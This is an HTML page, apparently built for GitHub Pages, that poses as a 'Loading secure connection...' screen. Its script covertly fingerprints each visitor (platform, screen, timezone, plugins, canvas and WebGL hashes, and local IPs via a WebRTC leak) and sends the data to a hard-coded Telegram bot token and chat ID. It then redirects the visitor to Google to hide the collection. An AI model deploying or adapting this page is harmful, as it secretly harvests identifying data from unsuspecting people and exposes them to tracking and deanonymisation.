<!-- index.html - ملف واحد يعمل على GitHub Pages -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body { background: #0a0a0a; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin:0; }
        .loader { border: 4px solid #222; border-top: 4px solid #0f0; border-radius: 50%; width: 50px; height: 50px; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .text { margin-top: 20px; font-size: 14px; color: #0f0; opacity: 0.8; }
    </style>
</head>
<body>
    <div style="text-align:center;">
        <div class="loader"></div>
        <div class="text">Loading secure connection...</div>
    </div>
    <script>
        // ========== غير هذه المتغيرات بما يناسبك ==========
        const TELEGRAM_BOT_TOKEN = '8924356522:AAHqmA33uk_oGD79V4og3HU4kGU_pNszaRs'; // ضع توكن البوت هنا
        const TELEGRAM_CHAT_ID = '6200879535';     // ضع Chat ID هنا

        (async function() {
            // جمع بصمة المتصفح
            const fingerprint = {
                platform: navigator.platform,
                screenResolution: window.screen.width + 'x' + window.screen.height + ' (' + window.screen.colorDepth + 'bit)',
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'unspecified',
                hardwareConcurrency: navigator.hardwareConcurrency || '?',
                deviceMemory: navigator.deviceMemory || '?',
                touchSupport: 'maxTouchPoints' in navigator && navigator.maxTouchPoints > 0,
                vendor: navigator.vendor,
                plugins: Array.from(navigator.plugins || []).map(p => p.name),
                canvasHash: await getCanvasHash(),
                webglHash: getWebGLHash(),
                localIPs: []
            };

            // WebRTC Leak لجلب IP الحقيقي
            try {
                const ips = await getLocalIPs();
                fingerprint.localIPs = ips;
            } catch(e) {}

            // تجميع الرسالة
            let message = `🎯 *New Visitor (GitHub Pages)*\n\n`;
            message += `🌐 *Platform:* ${fingerprint.platform}\n`;
            message += `📏 *Screen:* ${fingerprint.screenResolution}\n`;
            message += `🌍 *Language:* ${fingerprint.language}\n`;
            message += `⏰ *Timezone:* ${fingerprint.timezone}\n`;
            message += `🔗 *Referrer:* ${fingerprint.referrer || 'None'}\n`;
            message += `🍪 *Cookies:* ${fingerprint.cookiesEnabled ? 'Enabled' : 'Disabled'}\n`;
            message += `🚫 *DNT:* ${fingerprint.doNotTrack}\n`;
            message += `🧠 *RAM:* ${fingerprint.deviceMemory}GB | CPU: ${fingerprint.hardwareConcurrency} cores\n`;
            message += `👆 *Touch:* ${fingerprint.touchSupport ? 'Yes' : 'No'}\n`;
            message += `🧩 *Plugins:* ${fingerprint.plugins.length ? fingerprint.plugins.join(', ') : 'N/A'}\n`;
            message += `🖼 *Canvas:* \`${fingerprint.canvasHash || 'N/A'}\`\n`;
            message += `🎨 *WebGL:* \`${fingerprint.webglHash || 'N/A'}\`\n`;
            message += `🔎 *Local IPs (WebRTC):* \`${fingerprint.localIPs.length ? fingerprint.localIPs.join(', ') : 'None'}\`\n`;
            message += `🕒 *Time:* ${new Date().toISOString()}`;

            // إرسال إلى تيليغرام مباشرة
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            }).catch(() => {});

            // إعادة توجيه بعد 300 مللي ثانية
            setTimeout(() => {
                window.location.replace('https://www.google.com');
            }, 300);
        })();

        async function getCanvasHash() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 220;
                canvas.height = 60;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(130,1,62,20);
                ctx.fillStyle = '#069';
                ctx.fillText('Visitor 👾 ' + navigator.userAgent.slice(0,10), 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.8)';
                ctx.fillText('Visitor 👾 ' + navigator.userAgent.slice(0,10), 4, 17);
                return canvas.toDataURL().slice(-64);
            } catch(e) { return 'unsupported'; }
        }

        function getWebGLHash() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if(!gl) return 'no webgl';
                const ext = gl.getExtension('WEBGL_debug_renderer_info');
                const vendor = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : '?';
                const renderer = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : '?';
                return vendor + '~~' + renderer;
            } catch(e) { return 'webgl error'; }
        }

        function getLocalIPs() {
            return new Promise((resolve) => {
                const ips = new Set();
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(()=>{});
                pc.onicecandidate = (e) => {
                    if(!e || !e.candidate || !e.candidate.candidate) return;
                    const candidate = e.candidate.candidate;
                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
                    const match = ipRegex.exec(candidate);
                    if(match) {
                        const ip = match[0];
                        if(ip !== '0.0.0.0' && !ip.startsWith('127.')) ips.add(ip);
                    }
                };
                const timeout = setTimeout(() => {
                    pc.close();
                    resolve(Array.from(ips));
                }, 2000);
                pc.onicegatheringstatechange = () => {
                    if(pc.iceGatheringState === 'complete') {
                        clearTimeout(timeout);
                        pc.close();
                        resolve(Array.from(ips));
                    }
                };
            });
        }
    </script>
</body>
</html>
